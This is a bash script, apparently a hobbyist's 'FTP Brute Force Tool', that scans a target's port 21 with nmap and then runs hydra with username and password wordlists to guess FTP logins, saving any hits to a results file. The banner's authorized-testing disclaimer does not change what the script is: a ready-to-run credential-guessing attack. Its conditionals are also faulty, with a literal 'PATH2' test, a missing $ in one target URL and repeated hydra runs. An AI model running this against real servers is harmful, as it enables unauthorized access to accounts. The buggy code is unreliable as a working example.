#!/bin/bash
clear
# Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
NC='\033[0m'
BLUE="\e[34m"
NC="\e[0m"

clear

echo -e "${CYAN}"
echo "███████╗████████╗██████╗ "
echo "██╔════╝╚══██╔══╝██╔══██╗"
echo "█████╗     ██║   ██████╔╝"
echo "██╔══╝     ██║   ██╔═══╝ "
echo "██║        ██║   ██║     "
echo "╚═╝        ╚═╝   ╚═╝     "
echo
echo "██████╗ ██████╗ ██╗   ██╗████████╗███████╗"
echo "██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝"
echo "██████╔╝██████╔╝██║   ██║   ██║   █████╗  "
echo "██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  "
echo "██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗"
echo "╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝"
echo
echo "███████╗ ██████╗ ██████╗  ██████╗███████╗"
echo "██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝"
echo "█████╗  ██║   ██║██████╔╝██║     █████╗  "
echo "██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  "
echo "██║     ╚██████╔╝██║  ██║╚██████╗███████╗"
echo "╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝"
echo
echo -e "${RED}Author   : Rakan Ahmad${NC}"
echo -e "${RED}Tool     : FTP Brute Force Tool${NC}"
echo -e "${RED}Purpose  : Educational / Authorized Testing Only${NC}"
echo -e "${RED}Warning  : Use only on systems you own or have permission to test${NC}"
echo
echo -ne "${BLUE}[*] Starting tool"
sleep 0.5
echo -ne "."
sleep 0.5
echo -ne "."
sleep 0.5
echo -e ".${NC}"
sleep 1



read -p "Target Ip : " TARGET_IP
        if [ -z "$TARGET_IP" ]; 
then 
        echo "The Target Ip Cannot Be Empty"
exit 1    
        fi
if [ ! -z "$TARGET_IP" ]; 
        then
nmap -sV -p 21 "$TARGET_IP" > scan.txt
        fi
if grep "21/tcp open" scan.txt
        then
echo "FTP PORT OPEN"
        read -p "If You Have A Users Wordlists Insert The Path Here If You Dont Have Just Press Enter :" PATH1
read -p "If You Have A Passwords Wordlists Insert The Path Here If You Dont Have Just Press Enter :" PATH2
        else
echo "Sorry The Port 21 Is closed "
        fi
if [ ! -z "$PATH1" ] && [ ! -z "PATH2"]; 
        then 
hydra -L "$PATH1" -P "$PATH2" ftp://"TARGET_IP" -V
        else
hydra -L /home/kali/ftp-brute-force-tool/ftp_usernames_list.txt  -P /home/kali/ftp-brute-force-tool/ftp_passwords_list.txt ftp://"$TARGET_IP" -V -o login_result.txt -I
        fi
if [ -z "$PATH1"];
        then 
echo "Will Use admin Username as defulate..."
        hydra -L /home/kali/ftp-brute-force-tool/ftp_usernames_list.txt  -P "$PATH2" ftp://"$TARGET_IP" -V -o login_result.txt -I
else    
        hydra -L /home/kali/ftp-brute-force-tool/ftp_usernames_list.txt  -P /home/kali/ftp-brute-force-tool/ftp_passwords_list.txt ftp://"$TARGET_IP" -V -o login_result.txt -I
fi
        if [ -z "$PATH2"];
then
        echo "Will Use The Passwords List  File contined in the tool"
hydra -l "$PATH1" -P /home/kali/ftp-brute-force-tool/ftp_passwords_list.txt  ftp://"$TARGET_IP"
        else
hydra -L "$PATH1" -P "$PATH2" ftp://"$TARGET_IP" -V
fi
